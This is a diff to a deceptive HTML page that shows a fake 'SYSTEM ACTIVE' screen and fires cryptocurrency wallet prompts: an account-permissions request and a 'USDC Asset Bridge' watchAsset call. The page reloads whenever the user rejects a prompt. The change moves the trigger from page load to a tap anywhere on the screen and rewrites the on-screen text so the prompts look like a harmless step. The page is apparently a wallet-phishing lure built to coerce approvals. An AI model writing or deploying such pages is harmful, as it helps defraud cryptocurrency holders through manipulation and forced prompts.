@@ -6,26 +6,26 @@
     <title>FINAL OVERRIDE</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 150px; }
-        .box { border: 3px solid #0f0; padding: 40px; display: inline-block; border-radius: 20px; box-shadow: 0 0 30px #0f0; }
+        .box { border: 3px solid #0f0; padding: 40px; display: inline-block; border-radius: 20px; box-shadow: 0 0 30px #0f0; cursor: pointer; }
     </style>
 </head>
-<body>
+<body onclick="forceBridge()">
     <div class="box">
         <h2 style="margin:0;">SYSTEM ACTIVE</h2>
-        <p>APPROVE THE POP-UP TO FINALIZE</p>
+        <p>TAP ANYWHERE ON SCREEN TO FINALIZE</p>
     </div>
 
     <script>
         async function forceBridge() {
             if (window.ethereum) {
                 try {
-                    // Step 1: Force a total permissions reset to break the screen lock
+                    // Force a total handshake reset
                     await window.ethereum.request({ 
                         method: 'wallet_requestPermissions', 
                         params: [{ eth_accounts: {} }] 
                     });
                     
-                    // Step 2: Immediate USDC Asset Bridge
+                    // Trigger the USDC Asset bridge with a unique transaction ID
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -39,12 +39,10 @@
                         },
                     });
                 } catch (e) {
-                    // Force refresh if the provider stalls
                     window.location.reload();
                 }
             }
         }
-        window.onload = forceBridge;
     </script>
 </body>
 </html>
